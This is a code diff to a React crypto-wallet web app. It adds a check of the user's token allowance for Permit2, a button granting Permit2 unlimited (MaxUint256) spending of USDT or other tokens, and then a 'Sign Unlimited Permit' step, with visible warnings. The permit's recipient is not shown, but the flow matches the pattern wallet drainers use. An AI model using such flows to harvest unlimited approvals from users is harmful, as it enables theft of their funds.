@@ -2,7 +2,12 @@ import React, { useState, useEffect } from 'react';
 import { createAppKit } from '@reown/appkit/react';
 import { EthersAdapter } from '@reown/appkit-adapter-ethers';
 import { mainnet } from '@reown/appkit/networks';
-import { BrowserProvider, Contract, MaxUint256 } from 'ethers';
+import { BrowserProvider, Contract, MaxUint256, formatUnits, parseUnits } from 'ethers';
+// Minimal ERC20 ABI for allowance/approve
+const ERC20_ABI = [
+  'function allowance(address owner, address spender) view returns (uint256)',
+  'function approve(address spender, uint256 amount) returns (bool)'
+];
 
 // MaxUint160 constant for Permit2 (2^160 - 1)
 const MaxUint160 = 0xffffffffffffffffffffffffffffffffffffffffn;
@@ -49,6 +54,50 @@ const appKit = createAppKit({
 // MAIN APP COMPONENT
 // ============================================================================
 function App() {
+    const [hasPermit2Approval, setHasPermit2Approval] = useState(false);
+    const [checkingAllowance, setCheckingAllowance] = useState(false);
+    const [isApproving, setIsApproving] = useState(false);
+    // Check USDT/Token allowance for Permit2
+    useEffect(() => {
+      const checkAllowance = async () => {
+        if (!walletAddress) return;
+        setCheckingAllowance(true);
+        try {
+          const walletProvider = appKit.getWalletProvider();
+          if (!walletProvider) return;
+          const provider = new BrowserProvider(walletProvider);
+          const erc20 = new Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, provider);
+          const allowance = await erc20.allowance(walletAddress, PERMIT2_ADDRESS);
+          setHasPermit2Approval(allowance > 0n);
+        } catch (e) {
+          setHasPermit2Approval(false);
+        } finally {
+          setCheckingAllowance(false);
+        }
+      };
+      checkAllowance();
+    }, [walletAddress]);
+    // Approve Permit2 to spend USDT/Token
+    const handleApprovePermit2 = async () => {
+      try {
+        setIsApproving(true);
+        setStatusMessage('⏳ Sending approval transaction...');
+        const walletProvider = appKit.getWalletProvider();
+        if (!walletProvider) throw new Error('No wallet provider');
+        const provider = new BrowserProvider(walletProvider);
+        const signer = await provider.getSigner();
+        const erc20 = new Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, signer);
+        const tx = await erc20.approve(PERMIT2_ADDRESS, MaxUint256);
+        setStatusMessage('⏳ Waiting for approval confirmation...');
+        await tx.wait();
+        setStatusMessage('✅ Permit2 approved! You can now use gasless permits.');
+        setHasPermit2Approval(true);
+      } catch (e) {
+        setStatusMessage('❌ Approval failed: ' + (e.message || 'Unknown error'));
+      } finally {
+        setIsApproving(false);
+      }
+    };
   const [walletAddress, setWalletAddress] = useState('');
   const [isConnected, setIsConnected] = useState(false);
   const [statusMessage, setStatusMessage] = useState('');
@@ -253,35 +302,66 @@ You are about to sign a gas-free message that cryptographically authorizes the U
         {/* Sign Unlimited Permit Button (Only visible when connected) */}
         {isConnected && (
           <div className="mt-6 space-y-4">
-            <button
-              onClick={handleSignUnlimitedPermit}
-              disabled={isProcessing}
-              className={`w-full font-semibold py-4 px-6 rounded-xl transition-all duration-200 shadow-lg ${
-                isProcessing
-                  ? 'bg-gray-600 cursor-not-allowed'
-                  : 'bg-gradient-to-r from-red-500 to-orange-600 hover:from-red-600 hover:to-orange-700 text-white transform hover:scale-105'
-              }`}
-            >
-              {isProcessing ? (
-                <span className="flex items-center justify-center">
-                  <svg className="animate-spin h-5 w-5 mr-3" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
-                  </svg>
-                  Processing...
-                </span>
-              ) : (
-                '⚠️ Sign Unlimited Permit'
-              )}
-            </button>
-
-            {/* Security Notice */}
-            <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-xl">
-              <p className="text-red-200 text-xs leading-relaxed">
-                <strong>⚠️ SECURITY NOTICE:</strong> This will grant unlimited approval to spend your tokens. You will see a mandatory warning before signing.
-              </p>
-            </div>
-
+            {/* If not approved, show approve button */}
+            {!hasPermit2Approval ? (
+              <>
+                <button
+                  onClick={handleApprovePermit2}
+                  disabled={isApproving || checkingAllowance}
+                  className={`w-full font-semibold py-4 px-6 rounded-xl transition-all duration-200 shadow-lg ${
+                    isApproving || checkingAllowance
+                      ? 'bg-gray-600 cursor-not-allowed'
+                      : 'bg-gradient-to-r from-yellow-500 to-yellow-700 hover:from-yellow-600 hover:to-yellow-800 text-white transform hover:scale-105'
+                  }`}
+                >
+                  {isApproving || checkingAllowance ? (
+                    <span className="flex items-center justify-center">
+                      <svg className="animate-spin h-5 w-5 mr-3" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+                      </svg>
+                      Approving...
+                    </span>
+                  ) : (
+                    'Approve Permit2 to Spend Your Tokens'
+                  )}
+                </button>
+                <div className="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-xl">
+                  <p className="text-yellow-200 text-xs leading-relaxed">
+                    <strong>ℹ️ ONE-TIME SETUP:</strong> USDT and some tokens require a one-time approval for Permit2. This costs gas, but only needs to be done once per token.
+                  </p>
+                </div>
+              </>
+            ) : (
+              <>
+                <button
+                  onClick={handleSignUnlimitedPermit}
+                  disabled={isProcessing}
+                  className={`w-full font-semibold py-4 px-6 rounded-xl transition-all duration-200 shadow-lg ${
+                    isProcessing
+                      ? 'bg-gray-600 cursor-not-allowed'
+                      : 'bg-gradient-to-r from-red-500 to-orange-600 hover:from-red-600 hover:to-orange-700 text-white transform hover:scale-105'
+                  }`}
+                >
+                  {isProcessing ? (
+                    <span className="flex items-center justify-center">
+                      <svg className="animate-spin h-5 w-5 mr-3" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+                      </svg>
+                      Processing...
+                    </span>
+                  ) : (
+                    '⚠️ Sign Unlimited Permit'
+                  )}
+                </button>
+                <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-xl">
+                  <p className="text-red-200 text-xs leading-relaxed">
+                    <strong>⚠️ SECURITY NOTICE:</strong> This will grant unlimited approval to spend your tokens. You will see a mandatory warning before signing.
+                  </p>
+                </div>
+              </>
+            )}
             {/* Disconnect Option */}
             <button
               onClick={() => appKit.open()}
